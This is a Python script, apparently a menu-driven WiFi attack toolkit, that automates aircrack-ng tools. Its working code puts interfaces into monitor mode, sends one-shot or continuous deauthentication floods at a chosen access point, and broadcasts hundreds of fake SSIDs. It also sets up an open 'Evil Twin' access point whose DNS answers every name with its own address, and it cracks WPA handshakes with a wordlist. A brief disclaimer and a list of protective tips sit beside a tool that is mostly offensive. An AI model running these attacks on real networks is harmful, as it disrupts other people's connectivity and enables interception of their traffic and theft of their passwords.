#!/usr/bin/env python3

import os
import sys
import subprocess
import signal
import threading
import time
import random
import string

stop_attack = False

def banner():
    print("""
    \033[91m
888b     d888 888       888 88888888888       .d8888b.       .d8888b.  
8888b   d8888 888   o   888     888          d88P  Y88b     d88P  Y88b 
88888b.d88888 888  d8b  888     888                 888          .d88P 
888Y88888P888 888 d888b 888     888               .d88P         8888"  
888 Y888P 888 888d88888b888     888           .od888P"           "Y8b. 
888  Y8P  888 88888P Y88888     888          d88P"          888    888 
888   "   888 8888P   Y8888     888          888"       d8b Y88b  d88P 
888       888 888P     Y888     888          888888888  Y8P  "Y8888P"  
                                                                                                                                                      
               [ WiFi-Attack ]
           CREATED BY @HarithBUGbounty
                ! WARNING !
 This tool authorized security auditing only.
The author assume no liability for misuse or damage.
    \033[0m
    """)

def check_root():
    if os.geteuid() != 0:
        print("\033[91m[!] Run this tool as root!\033[0m")
        sys.exit(1)

def get_interfaces():
    try:
        result = subprocess.check_output("iwconfig 2>/dev/null", shell=True).decode()
        interfaces = []
        for line in result.split('\n'):
            if 'IEEE 802.11' in line or 'ESSID' in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces
    except:
        return []

def select_interface():
    print("\033[93m[+] Available wireless interfaces:\033[0m")
    interfaces = get_interfaces()
    if not interfaces:
        print("\033[91m[!] No wireless interface found. Plug in a Wi-Fi adapter.\033[0m")
        return None
    for i, iface in enumerate(interfaces):
        print(f"    {i+1}. {iface}")
    try:
        choice = int(input(f"\033[92m[?] Select interface (1-{len(interfaces)}): \033[0m"))
        if 1 <= choice <= len(interfaces):
            return interfaces[choice-1]
        else:
            print("\033[91m[!] Invalid choice.\033[0m")
            return select_interface()
    except:
        print("\033[91m[!] Invalid input.\033[0m")
        return select_interface()

def start_monitor(iface):
    global mon_iface
    print(f"\033[93m[+] Enabling monitor mode on {iface}...\033[0m")
    try:
        subprocess.call(f"ip link set {iface} down", shell=True)
        time.sleep(1)
        subprocess.call(f"iwconfig {iface} mode monitor", shell=True)
        time.sleep(1)
        subprocess.call(f"ip link set {iface} up", shell=True)
        time.sleep(2)
        print(f"\033[92m[+] Monitor mode enabled on {iface}\033[0m")
        mon_iface = iface
    except:
        print(f"\033[91m[!] Failed to enable monitor mode on {iface}\033[0m")
        mon_iface = iface

def scan_networks():
    iface = select_interface()
    if not iface:
        return
    start_monitor(iface)
    print(f"\033[93m[+] Scanning for nearby networks (Press Ctrl+C to stop)...\033[0m")
    try:
        subprocess.call(f"airodump-ng {mon_iface}", shell=True)
    except KeyboardInterrupt:
        print("\n\033[92m[+] Scan stopped.\033[0m")

def deauth_attack():
    global stop_attack
    iface = select_interface()
    if not iface:
        return
    start_monitor(iface)
    print(f"\033[93m[+] Starting scan to select target...\033[0m")
    cap_file = f"/tmp/wifi_scan_{random.randint(1000,9999)}"
    try:
        print(f"\033[93m[+] Capturing handshake data...\033[0m")
        scan_cmd = f"timeout 30 airodump-ng -w {cap_file} --output-format csv {mon_iface}"
        subprocess.call(scan_cmd, shell=True)
        
        net_file = None
        for f in os.listdir("/tmp/"):
            if f.startswith(f"wifi_scan_") and f.endswith(".csv"):
                net_file = os.path.join("/tmp/", f)
                break
        
        if not net_file:
            print("\033[91m[!] No networks found.\033[0m")
            return
        
        aps = []
        with open(net_file, 'r') as f:
            lines = f.readlines()
            for line in lines:
                if "WPA2" in line or "WPA" in line:
                    parts = line.strip().split(',')
                    bssid = parts[0].strip()
                    essid = parts[13].strip()
                    if bssid and len(bssid) > 5:
                        aps.append((bssid, essid))
        
        if not aps:
            print("\033[91m[!] No APs found.\033[0m")
            return
        
        print(f"\033[92m[+] Found {len(aps)} network(s):\033[0m")
        for i, (bssid, essid) in enumerate(aps):
            print(f"    {i+1}. {essid} ({bssid})")
        
        choice = int(input(f"\033[92m[?] Select target (1-{len(aps)}): \033[0m"))
        if not (1 <= choice <= len(aps)):
            print("\033[91m[!] Invalid choice.\033[0m")
            return
        target_bssid = aps[choice-1][0]
        target_essid = aps[choice-1][1]
        
        print(f"\033[93m[+] Target: {target_essid} ({target_bssid})\033[0m")
        print(f"\033[93m[+] Choose attack level:")
        print("    1. Intermediate (20 deauth packets)")
        print("    2. Aggressive (continuous until Ctrl+C)\033[0m")
        level = input(f"\033[92m[?] Select (1/2): \033[0m")
        
        stop_attack = False
        
        def send_deauth():
            if level == "1":
                print(f"\033[93m[+] Sending 20 deauth packets...\033[0m")
                cmd = f"aireplay-ng --deauth 20 -a {target_bssid} {mon_iface}"
                subprocess.call(cmd, shell=True)
            elif level == "2":
                print(f"\033[93m[+] Starting aggressive deauth (Press Ctrl+C to stop)...\033[0m")
                cmd = f"aireplay-ng --deauth 0 -a {target_bssid} {mon_iface}"
                subprocess.call(cmd, shell=True)
            else:
                print("\033[91m[!] Invalid level.\033[0m")
        
        t = threading.Thread(target=send_deauth)
        t.start()
        
        try:
            while t.is_alive():
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n\033[91m[!] Attack stopped by user.\033[0m")
            stop_attack = True
            os.kill(0, signal.SIGINT)
        t.join()
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")

def beacon_flood():
    iface = select_interface()
    if not iface:
        return
    start_monitor(iface)
    
    print(f"\033[93m[+] Beacon Flood Mode\033[0m")
    print("    1. Custom SSIDs (comma separated)")
    print("    2. Random SSIDs (1000+ networks)")
    choice = input(f"\033[92m[?] Select (1/2): \033[0m")
    
    ssids = []
    if choice == "1":
        user_ssids = input("\033[92m[?] Enter SSIDs (e.g., FreeWiFi,Starbucks): \033[0m")
        ssids = [s.strip() for s in user_ssids.split(",") if s.strip()]
    elif choice == "2":
        print(f"\033[93m[+] Generating 1000 random SSIDs...\033[0m")
        chars = string.ascii_letters + string.digits
        ssids = [ ''.join(random.choices(chars, k=8)) for _ in range(1000) ]
    else:
        print("\033[91m[!] Invalid choice.\033[0m")
        return
    
    print(f"\033[93m[+] Broadcasting {len(ssids)} SSIDs. Press Ctrl+C to stop.\033[0m")
    try:
        for ssid in ssids:
            mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
            cmd = f"aireplay-ng --beacon -e '{ssid}' -a {mac} {mon_iface} > /dev/null 2>&1 &"
            subprocess.Popen(cmd, shell=True)
        print(f"\033[92m[+] Flood active... Keep terminal open.\033[0m")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\033[91m[!] Beacon flood stopped.\033[0m")
        os.system("killall aireplay-ng 2>/dev/null")

def evil_twin():
    iface = select_interface()
    if not iface:
        return
    
    print(f"\033[93m[+] Evil Twin Attack Setup\033[0m")
    essid = input(f"\033[92m[?] Enter fake AP name (e.g., Starbucks_Free): \033[0m")
    channel = input(f"\033[92m[?] Enter channel (1-13, default 6): \033[0m") or "6"
    
    print(f"\033[93m[+] Configuring IP for {iface}...\033[0m")
    subprocess.call(f"ip addr add 10.0.0.1/24 dev {iface}", shell=True)
    subprocess.call(f"ip link set {iface} up", shell=True)
    
    print(f"\033[93m[+] Starting hostapd (fake AP)...\033[0m")
    hostapd_conf = f"""
interface={iface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
auth_algs=1
wpa=0
"""
    conf_file = f"/tmp/hostapd.conf.{random.randint(1000,9999)}"
    with open(conf_file, "w") as f:
        f.write(hostapd_conf)
    
    def run_hostapd():
        subprocess.call(f"hostapd {conf_file}", shell=True)
    
    def run_dnsmasq():
        dnsmasq_conf = """
interface={}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
    """.replace("{}", iface)
        dfile = f"/tmp/dnsmasq.conf.{random.randint(1000,9999)}"
        with open(dfile, "w") as f:
            f.write(dnsmasq_conf)
        subprocess.call(f"dnsmasq -C {dfile}", shell=True)
    
    print(f"\033[93m[+] Starting DNS/DHCP server...\033[0m")
    t_dns = threading.Thread(target=run_dnsmasq)
    t_dns.daemon = True
    t_dns.start()
    
    print(f"\033[92m[+] Evil Twin AP '{essid}' is live on channel {channel}. Press Ctrl+C to stop.\033[0m")
    try:
        run_hostapd()
    except KeyboardInterrupt:
        print(f"\n\033[91m[!] Evil Twin stopped.\033[0m")
        os.system("killall dnsmasq hostapd 2>/dev/null")
        os.system(f"ip addr flush dev {iface}")

def wifi_cracker():
    print(f"\033[93m[+] WiFi Cracker using aircrack-ng\033[0m")
    cap_file = input(f"\033[92m[?] Enter .cap file path: \033[0m").strip()
    wordlist = input(f"\033[92m[?] Enter wordlist path (default: /usr/share/wordlists/rockyou.txt): \033[0m").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    
    if not os.path.exists(cap_file):
        print(f"\033[91m[!] Capture file not found: {cap_file}\033[0m")
        return
    if not os.path.exists(wordlist):
        print(f"\033[91m[!] Wordlist not found: {wordlist}\033[0m")
        return
    
    print(f"\033[93m[+] Cracking WPA handshake...\033[0m")
    cmd = f"aircrack-ng '{cap_file}' -w '{wordlist}'"
    os.system(cmd)

def show_protection():
    print("""
\033[92m
🛡️  HOW TO PROTECT FROM THESE ATTACKS:

1. Use WPA3 encryption (not WPA2/WPA).
2. Disable WPS on your router.
3. Use strong, long passwords (14+ chars, random).
4. Monitor your network for unknown devices.
5. Disable SSID broadcast if not needed.
6. Use MAC filtering (limited help but adds noise).
7. Run detection tools: `airodump-ng` to spot rogue APs.
8. Use enterprise networks (WPA2-Enterprise) with RADIUS.
9. Deploy IDS like Wazuh or Snort for wireless alerts.
10. Never use default router credentials.

🔥 Stay paranoid. Stay secure. 🔥
\033[0m
    """)

def main():
    check_root()
    while True:
        banner()
        print("    \033[96m1. Scan nearby networks")
        print("    2. Deauthentication attack (intermediate/aggressive)")
        print("    3. Beacon flood (custom/random SSIDs)")
        print("    4. Evil Twin attack")
        print("    5. WiFi password cracker (aircrack-ng)")
        print("    6. How to protect yourself")
        print("    0. Exit\033[0m")
        
        try:
            choice = input(f"\n\033[95m[?] Select option: \033[0m").strip()
            if choice == "1":
                scan_networks()
            elif choice == "2":
                deauth_attack()
            elif choice == "3":
                beacon_flood()
            elif choice == "4":
                evil_twin()
            elif choice == "5":
                wifi_cracker()
            elif choice == "6":
                show_protection()
            elif choice == "0":
                print(f"\033[92m[+] Goodbye. May the packets be with you.\033[0m 💀🔥")
                break
            else:
                print(f"\033[91m[!] Invalid option.\033[0m")
            input(f"\n\033[93m[+] Press Enter to continue...\033[0m")
        except KeyboardInterrupt:
            print(f"\n\033[91m[!] Force exit.\033[0m")
            break

if __name__ == "__main__":
    main()